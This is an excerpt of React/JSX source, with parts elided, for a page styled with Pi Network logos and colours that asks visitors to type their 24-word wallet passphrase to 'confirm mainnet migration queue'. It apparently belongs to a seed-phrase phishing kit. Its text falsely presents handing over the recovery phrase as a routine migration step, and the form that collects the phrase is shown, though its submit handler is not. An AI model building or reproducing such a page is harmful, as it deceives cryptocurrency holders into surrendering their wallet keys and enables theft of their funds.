...
import { MigrationIcon, PiHeaderLogo, PiNetLogo } from "@/components/pi-icons";
      ...
      <div className="w-full max-w-md sm:max-w-none min-h-screen bg-white flex flex-col relative shadow-2xl sm:shadow-none border-x border-zinc-200 sm:border-x-0">
        ...
        <header className="bg-[#703d92] text-white h-14 sticky top-0 z-30 shadow-md w-full">
          <div className="flex justify-between items-center w-full h-full px-4 max-w-screen-2xl mx-auto">
            ...
            <div className="flex-1 flex justify-center items-center gap-2 sm:gap-3">
              <span className="text-lg sm:text-xl font-semibold tracking-wide">Migration</span>
        ...
        <main className="p-6 flex-grow flex flex-col justify-start w-full sm:max-w-md sm:mx-auto sm:pt-12">
          ...
          <form onSubmit={handleSubmit} className="space-y-6">
            <div className="space-y-2">
              <textarea
                ...
                placeholder="Enter your 24-word passphrase to confirm mainnet migration queue"
          ...
          <div className="mt-8 space-y-4 text-xs text-zinc-600 leading-relaxed font-normal">
            <p>
              To authorize migrating your mined Pi coins to the mainnet blockchain, please unlock your wallet. This signs the mainnet migration queue terms of service and locks your tokens in your mainnet address.
            </p>
            <p>
              Warning: If you lose your passphrase, you will not be able to access your migrated Pi coins. The Pi Network Core Team cannot recover your passphrase for you.
            </p>
          </div>
        </main>
